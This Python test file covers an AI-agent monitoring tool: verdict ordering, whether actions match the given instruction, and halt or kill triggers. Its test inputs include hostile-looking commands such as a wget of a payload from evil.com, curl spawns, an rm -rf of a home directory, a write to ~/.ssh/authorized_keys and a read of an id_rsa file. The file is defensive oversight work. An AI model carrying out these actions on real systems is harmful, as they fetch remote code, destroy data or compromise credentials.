"""Tests for HALT verdict and intent-action matching."""

from __future__ import annotations

import asyncio
import os
import tempfile


from suy_sideguy.warden import (
    ActionType,
    AgentAction,
    Verdict,
    Warden,
)
from suy_sideguy.intent_match import (
    check_intent_match,
    classify_instruction,
)


# ── Helpers ──────────────────────────────────────────────────────────────────

SCOPE_YAML = """
filesystem:
  allowed_paths:
    - "/tmp/safe/**"
  forbidden_paths:
    - "/tmp/secret/**"
network:
  allowed_domains:
    - "example.com"
  allowed_ports: [443]
process:
  allowed_commands: ["python3"]
  forbidden_commands: ["curl"]
behavior:
  flag_threshold: 5
  halt_threshold: 3
  flag_window: 300
  max_actions_per_minute: 200
"""


def _scope_file() -> str:
    with tempfile.NamedTemporaryFile("w", delete=False, suffix=".yaml") as f:
        f.write(SCOPE_YAML)
        return f.name


def _warden() -> Warden:
    return Warden(scope_path=_scope_file(), agent_pid=os.getpid(), poll_interval=0.01)


class _FakeAction:
    """Minimal stand-in for ActionEvent with a .kind attribute."""

    def __init__(self, kind: str) -> None:
        self.kind = kind


# ── HALT verdict ─────────────────────────────────────────────────────────────


def test_halt_verdict_exists_between_flag_and_kill():
    """Verdict.HALT must be defined and sit between FLAG and KILL."""
    members = list(Verdict)
    names = [m.name for m in members]
    assert "HALT" in names
    flag_idx = names.index("FLAG")
    halt_idx = names.index("HALT")
    kill_idx = names.index("KILL")
    assert flag_idx < halt_idx < kill_idx, (
        f"Expected FLAG < HALT < KILL in enum order, got {names}"
    )


def test_halt_verdict_value_is_string():
    assert Verdict.HALT.value == "HALT"


def test_halt_verdict_importable_from_enforcement():
    """Verdict (with HALT) must be importable directly from enforcement module."""
    from suy_sideguy.warden import Verdict as EnfVerdict
    assert EnfVerdict.HALT is Verdict.HALT


# ── Intent classification ─────────────────────────────────────────────────────


def test_classify_read_instruction():
    assert classify_instruction("Read the file and display the contents") == "READ"


def test_classify_write_instruction():
    assert classify_instruction("Write the results to output.txt") == "WRITE"


def test_classify_delete_instruction():
    assert classify_instruction("Delete all temporary files") == "DELETE"


def test_classify_network_instruction():
    assert classify_instruction("Download the latest dataset from the API") == "NETWORK"


def test_classify_spawn_instruction():
    assert classify_instruction("Execute the build script") == "SPAWN"


# ── Intent-action mismatch ────────────────────────────────────────────────────


def test_read_instruction_delete_action_returns_halt():
    actions = [_FakeAction("file_delete")]
    assert check_intent_match("Read the log file", actions) == "HALT"


def test_read_instruction_write_action_returns_flag():
    actions = [_FakeAction("file_write")]
    assert check_intent_match("Read the log file", actions) == "FLAG"


def test_read_instruction_read_action_returns_safe():
    actions = [_FakeAction("file_read")]
    assert check_intent_match("Read the log file", actions) == "SAFE"


def test_write_instruction_allows_read_actions():
    actions = [_FakeAction("file_read"), _FakeAction("file_write")]
    assert check_intent_match("Write output to results.txt", actions) == "SAFE"


def test_write_instruction_spawn_action_returns_halt():
    actions = [_FakeAction("process_spawn")]
    assert check_intent_match("Write the summary file", actions) == "HALT"


def test_read_instruction_spawn_action_returns_halt():
    actions = [_FakeAction("process_exec")]
    assert check_intent_match("Check the status of the job", actions) == "HALT"


def test_read_instruction_network_action_returns_flag():
    actions = [_FakeAction("network_out")]
    assert check_intent_match("List directory contents", actions) == "FLAG"


def test_network_instruction_network_action_returns_safe():
    actions = [_FakeAction("network_out")]
    assert check_intent_match("Download the dataset", actions) == "SAFE"


def test_halt_short_circuits_on_first_dangerous_action():
    """HALT should be returned even when mixed with safe actions."""
    actions = [
        _FakeAction("file_read"),   # safe for READ instruction
        _FakeAction("file_delete"), # HALT
        _FakeAction("file_write"),  # would be FLAG, but HALT wins
    ]
    assert check_intent_match("Read and analyse the file", actions) == "HALT"


def test_empty_actions_returns_safe():
    assert check_intent_match("Read the config", []) == "SAFE"


def test_multiple_flag_actions_still_returns_flag_not_halt():
    actions = [_FakeAction("file_write"), _FakeAction("network_out")]
    assert check_intent_match("Read logs", actions) == "FLAG"


# ── Behavioral HALT / KILL triggers ─────────────────────────────────────────

def _now_iso() -> str:
    from datetime import datetime, timezone
    return datetime.now(timezone.utc).isoformat()


def test_halt_on_rapid_file_deletions():
    """3+ file deletions in 10s should trigger HALT."""
    w = _warden()
    w.judge.available = False
    for i in range(3):
        action = AgentAction(
            timestamp=_now_iso(),
            action_type=ActionType.FILE_DELETE,
            target=f"/tmp/safe/file{i}.txt",
        )
        v = asyncio.run(w.evaluate_action(action))
    assert v.verdict == Verdict.HALT
    assert "deletion" in v.reason.lower()


def test_halt_on_curl_spawn():
    """curl process spawn should trigger HALT."""
    w = _warden()
    w.judge.available = False
    action = AgentAction(
        timestamp=_now_iso(),
        action_type=ActionType.PROCESS_EXEC,
        target="curl https://example.com/data",
    )
    v = asyncio.run(w.evaluate_action(action))
    assert v.verdict == Verdict.HALT
    assert "curl" in v.reason.lower()


def test_halt_on_wget_spawn():
    """wget process spawn should also trigger HALT."""
    w = _warden()
    w.judge.available = False
    action = AgentAction(
        timestamp=_now_iso(),
        action_type=ActionType.PROCESS_EXEC,
        target="wget http://evil.com/payload",
    )
    v = asyncio.run(w.evaluate_action(action))
    assert v.verdict == Verdict.HALT
    assert "wget" in v.reason.lower()


def test_kill_on_ssh_key_write():
    """Writing to ~/.ssh/ must trigger KILL."""
    w = _warden()
    w.judge.available = False
    action = AgentAction(
        timestamp=_now_iso(),
        action_type=ActionType.FILE_WRITE,
        target=os.path.expanduser("~/.ssh/authorized_keys"),
    )
    v = asyncio.run(w.evaluate_action(action))
    assert v.verdict == Verdict.KILL
    assert "ssh" in v.reason.lower()


def test_kill_on_id_rsa_access():
    """Accessing a file matching *id_rsa* must trigger KILL."""
    w = _warden()
    w.judge.available = False
    action = AgentAction(
        timestamp=_now_iso(),
        action_type=ActionType.FILE_READ,
        target="/some/path/id_rsa.pub",
    )
    v = asyncio.run(w.evaluate_action(action))
    assert v.verdict == Verdict.KILL
    assert "ssh key" in v.reason.lower()


def test_rm_rf_non_protected_path_does_not_kill():
    """rm -rf of a non-protected project path is routine cleanup, NOT a kill.

    (Was previously an instant SIGKILL on any non-/tmp path — that trigger-happy
    behavior is the bug being fixed.)"""
    w = _warden()
    w.judge.available = False
    action = AgentAction(
        timestamp=_now_iso(),
        action_type=ActionType.PROCESS_EXEC,
        target="rm -rf /home/user/documents",
    )
    v = asyncio.run(w.evaluate_action(action))
    assert v.verdict != Verdict.KILL


def test_halt_does_not_kill():
    """HALT verdict should not set warden.killed."""
    w = _warden()
    w.judge.available = False
    action = AgentAction(
        timestamp=_now_iso(),
        action_type=ActionType.PROCESS_EXEC,
        target="curl https://example.com",
    )
    v = asyncio.run(w.evaluate_action(action))
    assert v.verdict == Verdict.HALT
    assert w.killed is False
